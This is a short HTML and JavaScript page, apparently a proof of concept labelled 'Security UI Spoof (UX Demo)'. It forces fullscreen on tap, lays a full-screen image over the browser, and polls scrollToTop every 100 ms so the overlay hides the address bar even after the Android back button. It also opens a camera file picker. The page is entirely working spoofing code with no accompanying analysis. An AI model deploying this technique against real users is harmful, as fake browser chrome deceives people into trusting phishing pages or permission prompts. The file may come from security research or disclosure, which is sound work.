<!DOCTYPE html>
<html lang="en">
<head>
  <title>Security UI Spoof (UX Demo)</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #111;
      color: #fff;
      font-family: sans-serif;
      height: 200vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      overflow-x: hidden;
    }

    #spoof {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      display: block;
      z-index: 9999;
      pointer-events: none;
    }

    input[type=file] {
      display: none;
    }
  </style>
</head>
<body>

<img id="spoof" src="spof1.png" alt="UI overlay">
<div id="content">
  <h1>Tap anywhere to start demo</h1>
</div>

<input id="filePicker" type="file" accept="image/*" capture="environment">

<script>
const filePicker = document.getElementById('filePicker');

document.addEventListener('click', async () => {
  // Fullscreen
  if (document.documentElement.requestFullscreen) {
    try {
      await document.documentElement.requestFullscreen();
    } catch(e) {}
  }

  // Trigger file picker
  filePicker.click();

  // Hide content
  document.getElementById('content').style.display = 'none';
}, { once: true });

// Fungsi untuk scroll ke atas agar overlay menutupi omnibar
function scrollToTop() {
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Event fullscreenchange
document.addEventListener('fullscreenchange', () => {
  if (!document.fullscreenElement) {
    scrollToTop();
  }
});

// Polling tambahan untuk tombol back di Android
setInterval(() => {
  if (!document.fullscreenElement) {
    scrollToTop();
  }
}, 100);

filePicker.addEventListener('change', (e) => {
  if (filePicker.files.length > 0) {
    console.log('File selected:', filePicker.files[0].name);
    alert('File selected: ' + filePicker.files[0].name);
  }
});
</script>

</body>
</html>
